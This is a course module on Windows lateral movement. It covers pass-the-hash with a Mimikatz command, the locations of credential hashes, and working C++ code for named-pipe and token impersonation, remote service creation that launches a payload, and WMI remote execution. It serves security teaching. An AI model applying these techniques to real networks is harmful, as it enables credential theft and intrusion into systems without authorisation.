# Module 24 — Lateral Movement

## What lateral movement is

After initial compromise of one machine, attackers move to other machines
in the same network — typically towards domain controllers or high-value servers.

Common techniques:
```
Pass-the-Hash (PtH)     — authenticate using NTLM hash without knowing password
Pass-the-Ticket (PtT)   — authenticate using a stolen Kerberos ticket
Token impersonation     — steal a logged-in user's security token
Named pipe impersonation— trigger admin process to connect to your pipe, steal token
Remote services         — sc create + sc start over SMB (PsExec pattern)
WMI remote exec         — IWbemServices ExecMethod Win32_Process.Create
```

---

## 1. NTLM Authentication and Pass-the-Hash

NTLM authentication uses the NT hash of the password (MD4 of Unicode password).
It never sends the plaintext — only a challenge/response using the hash.

```
Normal:
  Client knows password → computes NT hash → uses in NTLM challenge-response

Pass-the-Hash:
  Attacker stole the NT hash (from SAM, LSASS, or network capture)
  → uses the hash directly in NTLM challenge-response
  → authenticates as the victim without ever knowing the plaintext password
```

**Where hashes come from:**
- `%SystemRoot%\System32\config\SAM` — local accounts (offline dump)
- LSASS process memory — cached logged-in user credentials (Mimikatz target)
- Domain Controller NTDS.dit — all domain account hashes

**Implementation:** PtH is built into the NTLM protocol. Tools like `Mimikatz`
do `sekurlsa::pth /user:admin /domain:corp /ntlm:<hash>` to spawn a process
with that hash loaded into a fake logon session.

In C++: impersonating with a specific hash requires `LogonUserExExW` with
custom NTLM provider, or using undocumented LSASS patching (both are complex).
The important thing is understanding the concept.

---

## 2. Named Pipe Impersonation

A classic privilege escalation / lateral movement primitive:

```
1. Your process creates a named pipe: \\.\pipe\MyPipe
2. You trick a higher-privilege process (e.g., a Windows service) to
   connect to your pipe (e.g., via a UNC path or coercion attack)
3. You call ImpersonateNamedPipeClient() after the connection
4. Now your thread runs with the security token of the connecting process
5. You can then: create a new process that runs as that identity
```

```cpp
#include <windows.h>
#include <iostream>

bool namedPipeImpersonation(const char* pipeName) {
    // Step 1: Create the named pipe (as low-priv attacker)
    HANDLE hPipe = CreateNamedPipeA(
        pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 4096, 4096, 0, nullptr
    );
    if (hPipe == INVALID_HANDLE_VALUE) return false;
    printf("[*] Pipe created. Waiting for connection...\n");

    // Step 2: Wait for victim process to connect
    ConnectNamedPipe(hPipe, nullptr);
    printf("[+] Client connected!\n");

    // Step 3: Impersonate the client
    if (!ImpersonateNamedPipeClient(hPipe)) {
        CloseHandle(hPipe); return false;
    }
    printf("[+] Impersonating client token\n");

    // Step 4: Who are we now?
    HANDLE hToken;
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
        char name[256] = {}, domain[256] = {};
        DWORD nameLen = sizeof(name), domainLen = sizeof(domain);
        SID_NAME_USE use;
        TOKEN_USER* tu = nullptr;
        DWORD sz = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &sz);
        tu = (TOKEN_USER*)malloc(sz);
        GetTokenInformation(hToken, TokenUser, tu, sz, &sz);
        LookupAccountSidA(nullptr, tu->User.Sid, name, &nameLen, domain, &domainLen, &use);
        printf("[+] Impersonated as: %s\\%s\n", domain, name);
        free(tu); CloseHandle(hToken);
    }

    // Step 5: Create process as the victim identity (requires TOKEN_DUPLICATE)
    // RevertToSelf() when done
    RevertToSelf();
    CloseHandle(hPipe);
    return true;
}
```

---

## 3. SMB Remote Service (PsExec pattern)

PsExec works by:
1. Connecting to the target's `\\target\ADMIN$` share over SMB
2. Copying a service binary there (`PSEXESVC.exe`)
3. Opening the Service Control Manager on the remote machine
4. Creating and starting the service
5. The service runs your command as SYSTEM
6. Output is relayed back through a named pipe

**SCM remote access in C++:**
```cpp
// Open SCM on remote machine — requires admin credentials on remote
SC_HANDLE hScm = OpenSCManagerA(
    "192.168.1.100",     // remote machine name or IP
    SERVICES_ACTIVE_DATABASE,
    SC_MANAGER_ALL_ACCESS
);
if (!hScm) {
    printf("OpenSCManager failed: %lu (check creds)\n", GetLastError());
    return false;
}

// Create a service pointing to a binary already on the remote machine
SC_HANDLE hSvc = CreateServiceA(
    hScm, "MyRemoteSvc", "My Remote Service",
    SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
    SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
    "C:\\Windows\\Temp\\payload.exe",
    nullptr, nullptr, nullptr, nullptr, nullptr
);

// Start it
StartServiceA(hSvc, 0, nullptr);

// Clean up
DeleteService(hSvc);
CloseServiceHandle(hSvc);
CloseServiceHandle(hScm);
```

**Prerequisite:** the account you're running as must be in the remote machine's
local Administrators group, OR you have a stolen hash/ticket for such an account.

---

## 4. WMI Remote Execution

```cpp
// WMI (Windows Management Instrumentation) can execute processes remotely
// No service binary needed — uses the WMI infrastructure directly

#include <wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

void wmiExec(const wchar_t* target, const wchar_t* command) {
    CoInitialize(nullptr);

    IWbemLocator* pLoc = nullptr;
    CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                     IID_IWbemLocator, (LPVOID*)&pLoc);

    // Connect to remote WMI namespace
    IWbemServices* pSvc = nullptr;
    std::wstring ns = std::wstring(L"\\\\") + target + L"\\root\\cimv2";
    pLoc->ConnectServer((BSTR)ns.c_str(), nullptr, nullptr, 0, 0, 0, 0, &pSvc);

    // Set authentication
    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                      nullptr, EOAC_NONE);

    // Get Win32_Process class
    IWbemClassObject* pClass = nullptr;
    pSvc->GetObject((BSTR)L"Win32_Process", 0, nullptr, &pClass, nullptr);

    // Get Create method
    IWbemClassObject* pMethod = nullptr;
    pClass->GetMethod((BSTR)L"Create", 0, &pMethod, nullptr);

    IWbemClassObject* pParams = nullptr;
    pMethod->SpawnInstance(0, &pParams);

    VARIANT vCmd; V_VT(&vCmd) = VT_BSTR; V_BSTR(&vCmd) = (BSTR)command;
    pParams->Put(L"CommandLine", 0, &vCmd, 0);

    // Execute
    IWbemClassObject* pResult = nullptr;
    pSvc->ExecMethod((BSTR)L"Win32_Process", (BSTR)L"Create", 0, nullptr,
                     pParams, &pResult, nullptr);

    // Clean up omitted for brevity
    CoUninitialize();
}
```

---

## 5. Token Impersonation

Windows security tokens represent the identity of a process/thread.
If you can get a handle to a token (from an existing process), you can:
- `DuplicateTokenEx` → make a copy
- `ImpersonateLoggedOnUser` → run as that identity in current thread
- `CreateProcessWithTokenW` → spawn a process as that identity

```cpp
bool impersonateFromProcess(DWORD targetPid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPid);
    if (!hProcess) return false;

    HANDLE hToken = nullptr;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) {
        CloseHandle(hProcess); return false;
    }

    HANDLE hDupToken = nullptr;
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr,
                     SecurityImpersonation, TokenPrimary, &hDupToken);

    // Create a process with this token
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE,
                            L"C:\\Windows\\System32\\cmd.exe", nullptr,
                            0, nullptr, nullptr, &si, &pi);

    printf("[+] Created process as impersonated identity (PID=%lu)\n", pi.dwProcessId);

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return true;
}
```

---

## Exercises

- `ex01_named_pipe_server.cpp` — create pipe, wait for connection, impersonate
- `ex02_named_pipe_client.cpp` — connect to attacker-controlled pipe (victim simulator)
- `ex03_remote_service.cpp` — SCM-based remote service creation via OpenSCManagerA
- `ex04_token_enum.cpp` — enumerate all running processes, list their tokens + privileges
